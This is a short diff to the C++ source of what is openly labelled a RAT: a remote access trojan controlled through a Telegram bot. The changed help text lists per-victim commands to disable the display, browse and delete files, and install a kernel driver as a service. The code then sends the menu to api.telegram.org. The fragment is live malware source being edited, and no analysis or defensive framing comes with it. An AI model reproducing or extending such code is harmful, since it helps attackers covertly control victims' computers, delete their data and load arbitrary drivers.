@@ -168,16 +168,16 @@ INT_PTR DlgMain(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
 						"/user[ID] disable display - disable display user %0A"
 
 						"%0AFile manager:%0A"
-						"/user[ID] dir [C:\\Folder] - show files and folders in directory %0A"
+						"/user[ID] dir show [C:\\Folder] - show files and folders in directory %0A"
 						"/user[ID] dir del_file C:\\Path\\To\\File.exe - delete file into directory %0A"
 
 						"%0AService manager:%0A"
 						"/user[ID] service show - show all services in system %0A"
 						"/user[ID] service add [Name] [DisplayName] [C:\\ProgramData\\yourdriver.sys] [Type-Driver] [Start-Type] - load driver to system %0A"
-						"/user[ID] service delete [NameService] - delete service from system %0A";
+						"/user[ID] service delete [NameService] - delete service from system %0A"
 
 						"%0ARAT:%0A"
-						"/users - show online users%0A";
+						"/online - show online users%0A";
 						
 					path = "bot" + std::string(api) + "/sendMessage?chat_id=" + std::string(chatid) + "&text=" + text;
 					GetRequest("api.telegram.org", "B4DB4B3", path.c_str());
